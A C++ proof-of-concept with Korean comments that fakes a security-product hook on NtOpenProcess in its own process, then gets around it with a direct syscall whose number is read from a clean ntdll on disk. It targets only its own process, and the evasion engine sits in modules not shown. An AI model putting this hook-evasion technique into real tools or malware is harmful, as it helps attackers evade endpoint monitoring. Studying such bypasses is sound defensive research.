#include <iostream>
#include <windows.h>
#include <winternl.h>

//ntdll 순정과 ntdll 오염을 비교합니다.
//오염 상태는 표준 API 호출과 직접 Syscall 호출의 결과를 비교합니다.
//결과적으로 순정 상태는 표준 API를 방식으로도 시스템 작동이 가능했습니다.
//오염상태는 표준 API로 호출이 되지 않았습니다. 순정 상태는 되는 것은 ntdll.dll 자체의 문제가 아님을 증명합니
//오염 상태에서도 직접 Syscall 호출은 성공을 했습니다.
import Auditor.Core;
import Auditor.PE;
import Auditor.Syscall;

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

// [자가 후킹 함수] 호출되면 무조건 실패 코드를 뱉게 만드는 EDR 역할 플레이
void DestroyFunction(void* targetAddr) {
    DWORD oldProtect;
    // 1. 메모리 영역을 쓰기 가능(READWRITE)으로 변경
    VirtualProtect(targetAddr, 5, PAGE_EXECUTE_READWRITE, &oldProtect);

    // 2. 함수의 첫 바이트를 0xC3 (RET, 즉시 반환)로 덮어써서 함수를 망가뜨림 (후킹 모사)
    // 혹은 무조건 에러(0xC0000005)를 반환하도록 어셈블리 주입 가능
    unsigned char* opcodes = (unsigned char*)targetAddr;
    opcodes[0] = 0xB8; // mov eax, 0xC0000022 (STATUS_ACCESS_DENIED)
    opcodes[1] = 0x22;
    opcodes[2] = 0x00;
    opcodes[3] = 0x00;
    opcodes[4] = 0xC0;
    opcodes[5] = 0xC3; // ret

    // 3. 권한 복구
    VirtualProtect(targetAddr, 5, oldProtect, &oldProtect);
}

int main() {
    SetConsoleOutputCP(65001);
    std::cout << "[*] --- EDR Bypass Proof of Concept (PoC) ---\n\n";

    // 원래 내 프로세스에 로드되어 있는 ntdll의 NtOpenProcess 주소를 가져옵니다.
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    void* localNtOpenProcess = (void*)GetProcAddress(hNtdll, "NtOpenProcess");

    std::cout << "[1] Normal State: Calling standard Windows API...\n";
    HANDLE hTest1 = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());
    std::cout << "    -> Result: " << (hTest1 ? "SUCCESS" : "FAILED") << " (Handle: " << hTest1 << ")\n\n";
    if (hTest1) CloseHandle(hTest1);

    // 로컬 ntdll의 NtOpenProcess를 인위적으로 후킹(오염)시킵니다.
    std::cout << "[!] Activating Mock EDR Hook (Corrupting local NtOpenProcess in memory)... \n";
    DestroyFunction(localNtOpenProcess);
    std::cout << "[!] Hook Injected successfully.\n\n";

    // 경우1 - 후킹된 상태에서 표준 API 호출하기
    std::cout << "[2] Test A: Calling standard API after EDR Hook...\n";
    HANDLE hTest2 = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());
    std::cout << "    -> Result: " << (hTest2 ? "SUCCESS" : "FAILED") << " (Handle: " << hTest2 << ")\n";
    std::cout << "    (표준 API는 망가진 ntdll을 거치기 때문에 무조건 실패하거나 거부당합니다.)\n\n";

    // 경우2 - 후킹된 상태에서 우리가 만든 직접 시스콜 호출하기
    std::cout << "[3] Test B: Executing Direct Syscall (v0.3.0 Engine)...\n";

    // 헬스 게이트 가동 (디스크의 깨끗한 ntdll에서 SSN 추출)
    Auditor::UnhookEngine engine;
    void* cleanNtdllBase = engine.GetCleanBaseAddress();
    void* cleanNtOpenProcess = Auditor::PE::GetFunctionAddressFromEAT(cleanNtdllBase, "NtOpenProcess");
    WORD ssn = Auditor::Syscall::GetSyscallNumber(cleanNtOpenProcess);

    HANDLE hProcess = NULL;
    OBJECT_ATTRIBUTES objAttr = { 0 };
    objAttr.Length = sizeof(OBJECT_ATTRIBUTES);
    CLIENT_ID clientId = { 0 };
    clientId.UniqueProcess = (HANDLE)static_cast<DWORD_PTR>(GetCurrentProcessId());

    NTSTATUS status = Auditor::Syscall::DirectSyscallInvoke(ssn, &hProcess, PROCESS_QUERY_INFORMATION, &objAttr, &clientId);

    if (NT_SUCCESS(status) && hProcess != NULL) {
        std::cout << "    -> Result: [+++++] ATTACK SUCCESS! [+++++]\n";
        std::cout << "    -> Spawned Handle: 0x" << std::hex << hProcess << "\n";
        std::cout << "    (메모리의 NtOpenProcess가 완전히 망가졌음에도, 우회하여 핸들을 따냈습니다!)\n";
        CloseHandle(hProcess);
    }
    else {
        std::cout << "    -> Result: FAILED (Status: 0x" << std::hex << status << ")\n";
    }

    return 0;
}